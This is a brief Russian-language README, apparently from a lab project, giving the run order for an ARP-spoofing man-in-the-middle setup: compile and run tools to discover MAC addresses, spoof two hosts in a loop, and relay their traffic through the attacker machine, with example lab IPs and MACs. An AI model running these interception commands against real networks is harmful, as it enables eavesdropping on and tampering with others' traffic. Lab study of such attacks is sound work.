Последовательность запуска:
1 - Выбор двух хостов (A и B) и определение их IP-адресов
2 - Компиляция discover (make debug_discover или make discover)
3 - Запуск discover для определения MAC-аресов (sudo ./discover -t <A|B-ip> -d <iface>)
4 - Компиляция spoofing (make debug_spoofing или make spoofing)
5 - Запуск spoofing "while do true ; sudo ./spoofing -s <A|B-ip> -t <MITM-ip> -d <iface> -T <A|B-mac address>"
6 - Запуск relay.py для перенаправления всех пакетов истинному получателю

Конкретно для моего примера:
 - Windows (192.168.0.9) (08:00:27:0b:ac:ad)
 - Debian (192.168.0.10) (08:00:27:83:f4:95)
 - Debian_1 (192.168.0.11) (08:00:27:64:95:42)